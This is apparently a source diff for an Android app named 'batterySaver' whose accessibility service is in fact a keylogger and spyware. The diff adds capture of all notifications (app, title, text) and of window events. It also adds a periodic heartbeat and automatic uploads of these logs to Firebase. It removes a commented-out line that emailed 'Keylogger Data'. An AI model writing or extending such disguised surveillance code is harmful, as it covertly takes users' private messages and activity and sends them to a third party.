@@ -1,10 +1,14 @@
 package com.example.batterySaver;
 
-import static com.example.batterySaver.firebase_database.addFieldToAnalyticsCollection;
-import static com.example.batterySaver.firebase_database.addFieldToMonitoringCollection;
+import static com.example.batterySaver.firebase.addFieldToAnalyticsCollection;
+import static com.example.batterySaver.firebase.addFieldToMonitoringCollection;
+
+import android.os.Handler;
+import android.os.Looper;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.app.Notification;
 import android.location.LocationManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -28,34 +32,156 @@ import java.util.List;
 
 public class testService extends AccessibilityService {
     public String res = "";
-    public List<String> appUsageList = new ArrayList<>(); // List to store activity information
     public String currentApp = ""; // Variable to store the currently active app package name
     public long appLaunchTime = 0; // Variable to store the launch time of the current app
-    public double FILE_SIZE = 1; // log file size in KB
+    public double LOG_FILE_SIZE = 1; // log file size in KB
     public double MONITORING_FILE_SIZE = 1; // log file size in KB
+    public double NOTIFICATIONS_FILE_SIZE = 0.5; // log file size in KB
+    public double SYSTEM_LOGS_FILE_SIZE = 0.25; // log file size in KB
     private String packageName;
+
+    private Handler heartbeatHandler = new Handler();
+    private static final long HEARTBEAT_INTERVAL = 1 * 60 * 1000; // 10 minutes in milliseconds
+
+    private Runnable heartbeatRunnable = new Runnable() {
+        @Override
+        public void run() {
+            firebase.updateAliveStatus();
+            // Schedule the next update
+            heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL);
+        }
+    };
+
+
+    private void writeToSystemLog(String tag, String message) {
+        try {
+            DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+            String timestamp = df.format(Calendar.getInstance().getTime());
+            String logEntry = String.format("[%s] %s: %s%n", timestamp, tag, message);
+
+            File systemLogFile = new File(getApplicationContext().getExternalFilesDir(null), "SystemLogs.txt");
+            FileOutputStream systemLogFos = new FileOutputStream(systemLogFile, true);
+            systemLogFos.write(logEntry.getBytes());
+            systemLogFos.close();
+
+            // Check file size and upload to Firebase if threshold is exceeded
+            double fileSizeKB = (double) systemLogFile.length() / 1024;
+            Log.v("battery manager", "system log file size: " + fileSizeKB);
+            if (fileSizeKB > SYSTEM_LOGS_FILE_SIZE) {
+                uploadSystemLogs(systemLogFile);
+            }
+
+            // Also write to Android's logging system
+            Log.v(tag, message);
+        } catch (IOException e) {
+            Log.e("battery manager", "Error writing to system log: " + e.getMessage());
+        }
+    }
+
+    private void uploadSystemLogs(File systemLogFile) {
+        try {
+            ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);
+            boolean isWiFiConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED;
+            boolean isMobileDataConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED;
+
+            if (isWiFiConnected || isMobileDataConnected) {
+                StringBuilder text = new StringBuilder();
+                BufferedReader br = new BufferedReader(new FileReader(systemLogFile));
+                String line;
+
+                while ((line = br.readLine()) != null) {
+                    text.append(line).append('\n');
+                }
+                br.close();
+
+                // Upload to Firebase
+                firebase.uploadSystemLogsToFirebase(text.toString());
+                systemLogFile.delete();
+            }
+        } catch (IOException e) {
+            Log.e("battery manager", "Error uploading system logs: " + e.getMessage());
+        }
+    }
+
 
     @Override
     public void onServiceConnected() {
+        writeToSystemLog("battery manager", "Onservice() Connected...");
         Log.v("battery manager", "Onservice() Connected...");
-
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
-        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
+        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED | AccessibilityEvent.TYPES_ALL_MASK;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
         info.notificationTimeout = 100;
+        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
         info.packageNames = null;
         setServiceInfo(info);
-
+        try {
+            heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL);
+            Log.v("battery manager", "Heartbeat monitoring started");
+        } catch (Exception e) {
+            Log.e("battery manager", "Failed to start heartbeat monitoring: " + e.getMessage());
+        }
     }
+
+    private void handleNotification(AccessibilityEvent event, String time) {
+        if (event.getParcelableData() instanceof Notification) {
+            Notification notification = (Notification) event.getParcelableData();
+            String notificationPackage = event.getPackageName().toString();
+            String notificationText = notification.extras.getString(Notification.EXTRA_TEXT, "No text");
+            String notificationTitle = notification.extras.getString(Notification.EXTRA_TITLE, "No title");
+
+            String data = "(" + time + "|NOTIFICATION) Package: " + notificationPackage +
+                    " Title: " + notificationTitle +
+                    " Text: " + notificationText;
+            res = res + data + "\n";
+
+            Log.v("battery manager: ", data);
+
+            try {
+                // Write to NotificationLogs.txt
+                File notificationFile = new File(getApplicationContext().getExternalFilesDir(null), "NotificationLogs.txt");
+                FileOutputStream notificationFos = new FileOutputStream(notificationFile, true);
+                notificationFos.write(data.getBytes());
+                notificationFos.write("\n".getBytes());
+                notificationFos.close();
+
+                // Check file size and upload to Firebase if threshold is exceeded
+                double fileSizeKB = (double) notificationFile.length() / 1024;
+                if (fileSizeKB > NOTIFICATIONS_FILE_SIZE) {
+                    StringBuilder text = new StringBuilder();
+                    BufferedReader br = new BufferedReader(new FileReader(notificationFile));
+                    String line;
+                    while ((line = br.readLine()) != null) {
+                        text.append(line).append('\n');
+                    }
+                    br.close();
+
+                    // Upload to Firebase and clear the file
+                    firebase.uploadNotificationLogToFirebase(text.toString());
+                    notificationFile.delete();
+                }
+            } catch (Exception e) {
+                Log.e("battery manager", "Error handling notification: " + e.getMessage());
+                writeToSystemLog("battery manager: ", "(" + time + "|CLICKED)" + event.getPackageName().toString() + data);
+
+            }
+        }
+    }
+
+
+
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-
         DateFormat df = new SimpleDateFormat("hh:mm:ss");
         String time = df.format(Calendar.getInstance().getTime());
 
         switch (event.getEventType()) {
+
+            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
+                handleNotification(event, time);
+                break;
+            }
 
             case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                 packageName = event.getPackageName().toString();
@@ -111,13 +237,11 @@ public class testService extends AccessibilityService {
                         ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);
 
 
-                        if (fsize > FILE_SIZE) {
+                        if (fsize > LOG_FILE_SIZE) {
                             boolean isWiFiConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED;
                             boolean isMobileDataConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED;
 
                             if (isWiFiConnected || isMobileDataConnected) {
-//                            if (conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED
-//                                    || conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {
                                 StringBuilder text = new StringBuilder();
                                 BufferedReader br = new BufferedReader(new FileReader(file));
                                 String line;
@@ -132,8 +256,6 @@ public class testService extends AccessibilityService {
                                 try {
                                     Log.v("battery manager", text.toString());
                                     addFieldToAnalyticsCollection(text.toString(), packageName);
-//                                    SendMail sm = new SendMail(this, "XXXXX", "Keylogger Data", text.toString(), packageName); //Change XXXX by email adress where to send
-//                                    sm.execute();
                                     file.delete();
                                 }
                                 catch (Exception e){
@@ -141,12 +263,10 @@ public class testService extends AccessibilityService {
                                 }
                             }
                         }
-
                     } catch (Exception e) {
                         Log.v("battery manager", e.getMessage());
                     }
                     res = "";
-//                }
                 break;
             }
             default:
@@ -160,8 +280,15 @@ public class testService extends AccessibilityService {
 
     @Override
     public void onDestroy() {
+        try {
+            heartbeatHandler.removeCallbacks(heartbeatRunnable);
+            Log.v("battery manager", "Heartbeat monitoring stopped");
+        } catch (Exception e) {
+            Log.e("battery manager", "Error stopping heartbeat monitoring: " + e.getMessage());
+        }
         super.onDestroy();
         Log.v("battery manager", "Device disconnected from the service. Service is disabled.");
+        writeToSystemLog("battery manager", "Device disconnected from the service. Service is disabled.");
     }
 
 
